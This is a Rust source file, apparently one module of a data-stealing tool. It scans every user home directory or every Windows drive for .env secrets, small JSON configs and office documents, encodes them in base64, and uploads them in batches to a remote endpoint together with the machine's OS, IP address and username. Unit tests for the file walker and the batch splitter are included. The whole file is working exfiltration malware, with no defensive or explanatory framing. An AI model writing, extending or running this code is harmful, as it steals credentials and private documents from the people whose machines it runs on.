use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use reqwest::blocking::Client;
use serde::Serialize;

use crate::SystemFingerprint;

const MAX_DIRECTORY_DEPTH: usize = 10;
const MAX_JSON_LINES: usize = 100;
const DEFAULT_MAX_BATCH_BYTES: usize = 256 * 1024;
const DEFAULT_MAX_ITEM_BYTES: usize = 128 * 1024;

const IGNORED_DIRECTORIES: &[&str] = &[
    "node_modules",
    "Library",
    "System",
    "Windows",
    "Program Files",
    "Program Files (x86)",
    "ProgramData",
    "AppData",
    "build",
    "dist",
    "out",
    "output",
    "release",
    "bin",
    "obj",
    "Debug",
    "Release",
    "target",
    "target2",
    "public",
    "private",
    "tmp",
    "temp",
    "var",
    "cache",
    "log",
    "logs",
    "sample",
    "samples",
    "assets",
    "media",
    "fonts",
    "icons",
    "images",
    "img",
    "static",
    "resources",
    "audio",
    "videos",
    "video",
    "music",
    "svn",
    "cvs",
    "hg",
    "mercurial",
    "registry",
    "__MACOSX",
    "vscode",
    "eslint",
    "prettier",
    "yarn",
    "pnpm",
    "next",
    "pkg",
    "move",
    "rustup",
    "toolchains",
    "migrations",
    "snapshots",
    "ssh",
    "socket.io",
    "svelte-kit",
    "vite",
    "coverage",
    "history",
    "terraform",
];

#[derive(Debug, Clone, Serialize)]
struct FilePayload {
    path: String,
    content: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct FilesBatchPayload<'a> {
    env_files: &'a [FilePayload],
    json_files: &'a [FilePayload],
    doc_files: &'a [FilePayload],
    operating_system: &'a str,
    ip_address: &'a str,
    username: &'a str,
}

pub struct FilesweepOptions {
    pub max_batch_bytes: usize,
    pub max_item_bytes: usize,
}

impl Default for FilesweepOptions {
    fn default() -> Self {
        Self {
            max_batch_bytes: DEFAULT_MAX_BATCH_BYTES,
            max_item_bytes: DEFAULT_MAX_ITEM_BYTES,
        }
    }
}

pub fn scan_filesystem() -> Vec<PathBuf> {
    let mut files = Vec::new();
    let ignored = ignored_directories();

    for root in scan_roots() {
        walk_directory(&root, 0, &ignored, &mut files);
    }

    files
}

pub fn send_scanned_files(
    endpoint: &str,
    fingerprint: &SystemFingerprint,
    scanned_paths: &[PathBuf],
    options: &FilesweepOptions,
) -> Result<()> {
    let mut env_files = Vec::new();
    let mut json_files = Vec::new();
    let mut doc_files = Vec::new();

    for path in scanned_paths {
        let file_name = match path.file_name().and_then(|name| name.to_str()) {
            Some(name) => name.to_lowercase(),
            None => continue,
        };

        if file_name.contains("package") {
            continue;
        }

        if file_name == ".env" || file_name.ends_with(".env") {
            if let Some(content) = read_env_file(path) {
                env_files.push(FilePayload {
                    path: path_to_string(path),
                    content,
                });
            }
            continue;
        }

        if file_name.ends_with(".json") {
            if let Some(content) = read_json_file(path) {
                json_files.push(FilePayload {
                    path: path_to_string(path),
                    content,
                });
            }
            continue;
        }

        if file_name.ends_with(".txt")
            || file_name.ends_with(".doc")
            || file_name.ends_with(".docx")
            || file_name.ends_with(".xlsx")
        {
            if let Some(content) = read_doc_file_base64(path) {
                doc_files.push(FilePayload {
                    path: path_to_string(path),
                    content,
                });
            }
        }
    }

    send_in_batches(
        endpoint,
        fingerprint,
        &env_files,
        &json_files,
        &doc_files,
        options,
    )
}

fn scan_roots() -> Vec<PathBuf> {
    match operating_system() {
        "linux" => linux_scan_roots(),
        "windows" => windows_scan_roots(),
        "mac" => mac_scan_roots(),
        _ => home_dir().into_iter().collect(),
    }
}

fn linux_scan_roots() -> Vec<PathBuf> {
    let mut roots = Vec::new();

    if let Some(home) = home_dir() {
        roots.push(home);
    }

    roots.extend(list_child_directories(Path::new("/home")));

    let root_home = PathBuf::from("/root");
    if root_home.is_dir() {
        roots.push(root_home.clone());
        roots.extend(list_child_directories(&root_home));
    }

    dedupe_roots(roots)
}

fn windows_scan_roots() -> Vec<PathBuf> {
    ('C'..='J')
        .map(|letter| PathBuf::from(format!("{letter}:\\")))
        .filter(|path| path.exists())
        .collect()
}

fn mac_scan_roots() -> Vec<PathBuf> {
    let users_root = Path::new("/Users");
    if users_root.is_dir() {
        let roots = list_child_directories(users_root);
        if !roots.is_empty() {
            return roots;
        }
    }

    home_dir().into_iter().collect()
}

fn list_child_directories(path: &Path) -> Vec<PathBuf> {
    let entries = match fs::read_dir(path) {
        Ok(entries) => entries,
        Err(_) => return Vec::new(),
    };

    entries
        .flatten()
        .filter_map(|entry| {
            let path = entry.path();
            entry.file_type().ok()?.is_dir().then_some(path)
        })
        .collect()
}

fn dedupe_roots(roots: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut seen = HashSet::new();
    roots
        .into_iter()
        .filter(|root| seen.insert(root.clone()))
        .collect()
}

fn walk_directory(
    current_dir: &Path,
    depth: usize,
    ignored: &HashSet<&str>,
    files: &mut Vec<PathBuf>,
) {
    if depth >= MAX_DIRECTORY_DEPTH {
        return;
    }

    let metadata = match fs::metadata(current_dir) {
        Ok(metadata) => metadata,
        Err(_) => return,
    };

    if !metadata.is_dir() {
        return;
    }

    let entries = match fs::read_dir(current_dir) {
        Ok(entries) => entries,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        let entry_path = entry.path();
        let file_type = match entry.file_type() {
            Ok(file_type) => file_type,
            Err(_) => continue,
        };

        if file_type.is_symlink() {
            continue;
        }

        let file_name = match entry_path.file_name().and_then(|name| name.to_str()) {
            Some(name) => name,
            None => continue,
        };

        if file_type.is_dir() {
            if file_name.starts_with('.') || ignored.contains(file_name) {
                continue;
            }

            walk_directory(&entry_path, depth + 1, ignored, files);
            continue;
        }

        if !file_type.is_file() {
            continue;
        }

        let lower_name = file_name.to_lowercase();
        if lower_name.contains("package") {
            continue;
        }

        if lower_name == ".env"
            || lower_name.ends_with(".env")
            || lower_name.ends_with(".json")
            || lower_name.ends_with(".txt")
            || lower_name.ends_with(".doc")
            || lower_name.ends_with(".docx")
            || lower_name.ends_with(".xlsx")
        {
            files.push(entry_path);
        }
    }
}

fn read_env_file(path: &Path) -> Option<String> {
    fs::read_to_string(path).ok()
}

fn read_json_file(path: &Path) -> Option<String> {
    let content = fs::read_to_string(path).ok()?;
    if content.lines().count() > MAX_JSON_LINES {
        return None;
    }

    Some(content)
}

fn read_doc_file_base64(path: &Path) -> Option<String> {
    let bytes = fs::read(path).ok()?;
    Some(STANDARD.encode(bytes))
}

fn send_in_batches(
    endpoint: &str,
    fingerprint: &SystemFingerprint,
    env_files: &[FilePayload],
    json_files: &[FilePayload],
    doc_files: &[FilePayload],
    options: &FilesweepOptions,
) -> Result<()> {
    let client = Client::new();
    let env_chunks = split_by_bytes(env_files, options.max_batch_bytes, options.max_item_bytes);
    let json_chunks = split_by_bytes(json_files, options.max_batch_bytes, options.max_item_bytes);
    let doc_chunks = split_by_bytes(doc_files, options.max_batch_bytes, options.max_item_bytes);
    let max_chunks = env_chunks
        .len()
        .max(json_chunks.len())
        .max(doc_chunks.len());

    for index in 0..max_chunks {
        let env_batch = env_chunks.get(index).map(Vec::as_slice).unwrap_or(&[]);
        let json_batch = json_chunks.get(index).map(Vec::as_slice).unwrap_or(&[]);
        let doc_batch = doc_chunks.get(index).map(Vec::as_slice).unwrap_or(&[]);

        let result = post_batch(
            &client,
            endpoint,
            fingerprint,
            env_batch,
            json_batch,
            doc_batch,
        )?;

        if result == BatchPostOutcome::PayloadTooLarge {
            if !env_batch.is_empty() {
                post_batch(&client, endpoint, fingerprint, env_batch, &[], &[])?
                    .ensure_success("envFiles")?;
            }
            if !json_batch.is_empty() {
                post_batch(&client, endpoint, fingerprint, &[], json_batch, &[])?
                    .ensure_success("jsonFiles")?;
            }
            if !doc_batch.is_empty() {
                post_batch(&client, endpoint, fingerprint, &[], &[], doc_batch)?
                    .ensure_success("docFiles")?;
            }
        }
    }

    Ok(())
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BatchPostOutcome {
    Success,
    PayloadTooLarge,
}

impl BatchPostOutcome {
    fn ensure_success(self, category: &str) -> Result<()> {
        match self {
            BatchPostOutcome::Success => Ok(()),
            BatchPostOutcome::PayloadTooLarge => {
                bail!("413 batch too large for {category}")
            }
        }
    }
}

fn post_batch(
    client: &Client,
    endpoint: &str,
    fingerprint: &SystemFingerprint,
    env_files: &[FilePayload],
    json_files: &[FilePayload],
    doc_files: &[FilePayload],
) -> Result<BatchPostOutcome> {
    let payload = FilesBatchPayload {
        env_files,
        json_files,
        doc_files,
        operating_system: &fingerprint.operating_system,
        ip_address: &fingerprint.ip_address,
        username: &fingerprint.username,
    };

    let response = client
        .post(endpoint)
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()
        .with_context(|| format!("failed to POST scanned files to {endpoint}"))?;

    if response.status() == reqwest::StatusCode::PAYLOAD_TOO_LARGE {
        return Ok(BatchPostOutcome::PayloadTooLarge);
    }

    if !response.status().is_success() {
        bail!("HTTP error! status: {}", response.status());
    }

    Ok(BatchPostOutcome::Success)
}

fn split_by_bytes(
    files: &[FilePayload],
    max_batch_bytes: usize,
    max_item_bytes: usize,
) -> Vec<Vec<FilePayload>> {
    let mut batches = Vec::new();
    let mut current = Vec::new();
    let mut current_bytes = 2;

    for file in files {
        let file_bytes = estimate_item_bytes(file);
        if file_bytes > max_item_bytes {
            continue;
        }

        let comma_bytes = if current.is_empty() { 0 } else { 1 };
        if current_bytes + file_bytes + comma_bytes > max_batch_bytes && !current.is_empty() {
            batches.push(current);
            current = Vec::new();
            current_bytes = 2;
        }

        let comma_bytes_after = if current.is_empty() { 0 } else { 1 };
        current.push(file.clone());
        current_bytes += file_bytes + comma_bytes_after;
    }

    if !current.is_empty() {
        batches.push(current);
    }

    batches
}

fn estimate_item_bytes(file: &FilePayload) -> usize {
    serde_json::to_string(file)
        .map(|json| json.len())
        .unwrap_or(usize::MAX)
}

fn ignored_directories() -> HashSet<&'static str> {
    IGNORED_DIRECTORIES.iter().copied().collect()
}

fn home_dir() -> Option<PathBuf> {
    if cfg!(windows) {
        std::env::var_os("USERPROFILE").map(PathBuf::from)
    } else {
        std::env::var_os("HOME").map(PathBuf::from)
    }
}

fn operating_system() -> &'static str {
    match std::env::consts::OS {
        "windows" => "windows",
        "macos" => "mac",
        "linux" => "linux",
        _ => "unknown",
    }
}

fn path_to_string(path: &Path) -> String {
    path.to_string_lossy().replace('\\', "/")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn write_file(path: &Path, contents: &str) {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }

        let mut file = fs::File::create(path).unwrap();
        file.write_all(contents.as_bytes()).unwrap();
    }

    #[test]
    fn classifies_env_json_and_doc_files() {
        let root = std::env::temp_dir().join(format!("fs-sweep-test-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);

        write_file(&root.join("secrets.env"), "KEY=1");
        write_file(&root.join("config.json"), "{\"a\":1}");
        write_file(&root.join("notes.txt"), "hello");
        write_file(&root.join("package-lock.json"), "{}");

        let mut refs = Vec::new();
        walk_directory(&root, 0, &ignored_directories(), &mut refs);

        let paths: HashSet<_> = refs.into_iter().collect();
        assert!(paths.contains(&root.join("secrets.env")));
        assert!(paths.contains(&root.join("config.json")));
        assert!(paths.contains(&root.join("notes.txt")));
        assert!(!paths.contains(&root.join("package-lock.json")));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn skips_json_files_over_line_limit() {
        let root = std::env::temp_dir().join(format!("fs-sweep-json-test-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);

        let lines = (0..101)
            .map(|index| format!("line-{index}"))
            .collect::<Vec<_>>()
            .join("\n");
        write_file(&root.join("large.json"), &lines);

        assert!(read_json_file(&root.join("large.json")).is_none());

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn splits_batches_by_byte_limit() {
        let files = vec![
            FilePayload {
                path: "a.env".to_string(),
                content: "x".repeat(100),
            },
            FilePayload {
                path: "b.env".to_string(),
                content: "y".repeat(100),
            },
        ];

        let batches = split_by_bytes(&files, 180, 128 * 1024);
        assert_eq!(batches.len(), 2);
    }
}
